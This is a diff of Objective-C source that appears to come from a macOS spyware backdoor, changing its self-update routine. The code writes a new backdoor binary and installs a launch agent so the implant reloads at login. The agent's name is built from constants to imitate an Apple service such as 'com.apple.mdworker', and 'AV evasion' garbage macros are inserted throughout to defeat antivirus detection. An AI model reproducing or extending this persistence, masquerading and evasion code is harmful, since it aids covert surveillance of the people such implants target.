@@ -58,31 +58,33 @@
   NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                   permission,
                                   NSFilePosixPermissions,
-                                  owner,
-                                  NSFileOwnerAccountID,
+//                                  owner,
+//                                  NSFileOwnerAccountID,
                                   nil];
   
   // AV evasion: only on release build
   AV_GARBAGE_003
+  NSError *err;
   
   success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                              ofItemAtPath: upgradePath
-                                                    error: nil];
+                                                    error: &err];
+  
   
   // AV evasion: only on release build
   AV_GARBAGE_005
   
   if (success == NO)
-      return success;  
-  
+  {
+    return success;  
+  }
+ 
   // AV evasion: only on release build
   AV_GARBAGE_002
   
   // Once the backdoor has been written, edit the backdoor Loader in order to
   // load the new updated backdoor upon reboot/login
-  NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
-                                   NSHomeDirectory(),
-                                   BACKDOOR_DAEMON_PLIST];
+  NSString *backdoorLaunchAgent = createLaunchdPlistPath();
   
   // AV evasion: only on release build
   AV_GARBAGE_004
@@ -99,9 +101,12 @@
   // AV evasion: only on release build
   AV_GARBAGE_000
   
-  [backdoorLaunchAgent release];
+  NSString *backdoorDaemonName = [NSString stringWithFormat:@"%@.%@.%@", 
+                                  DOMAIN_COM, 
+                                  DOMAIN_APL, 
+                                  LAUNCHD_NAME];
   
-  success = [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
+  success = [gUtil createLaunchAgentPlist: backdoorDaemonName
                                 forBinary: gBackdoorUpdateName];
   
   // AV evasion: only on release build
@@ -408,7 +413,7 @@
   // AV evasion: only on release build
   AV_GARBAGE_007
   
-#define XPC_UPGRADE @"xpc" 
+//#define XPC_UPGRADE @"xpc" 
 
   if (filename == nil)
     {
@@ -480,34 +485,6 @@
           AV_GARBAGE_003
           
         }
-      else if ([filename isEqualToString: XPC_UPGRADE])
-        {
-          // AV evasion: only on release build
-          AV_GARBAGE_007
-          
-          // FIXED-
-          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
-                                    [[NSBundle mainBundle] bundlePath],
-                                    RCS8_UPDATE_XPC];
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_008
-          
-          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
-                                                     error: nil];
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_009
-          
-          // And write it back
-          [fileContent writeToFile: _upgradePath
-                        atomically: YES];
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_000
-          
-          [_upgradePath release];
-        }
       else if ([filename isEqualToString: KEXT_UPGRADE])
         {          
           // TODO: Update kext binary inside Resources subfolder
@@ -518,6 +495,34 @@
           errorLog(@"Upgrade not supported (%@)", filename);
 #endif
         }
+//      else if ([filename isEqualToString: XPC_UPGRADE])
+//      {
+//        // AV evasion: only on release build
+//        AV_GARBAGE_007
+//        
+//        // FIXED-
+//        NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
+//                                  [[NSBundle mainBundle] bundlePath],
+//                                  RCS8_UPDATE_XPC];
+//        
+//        // AV evasion: only on release build
+//        AV_GARBAGE_008
+//        
+//        [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
+//                                                   error: nil];
+//        
+//        // AV evasion: only on release build
+//        AV_GARBAGE_009
+//        
+//        // And write it back
+//        [fileContent writeToFile: _upgradePath
+//                      atomically: YES];
+//        
+//        // AV evasion: only on release build
+//        AV_GARBAGE_000
+//        
+//        [_upgradePath release];
+//      }
     }
   
   // AV evasion: only on release build
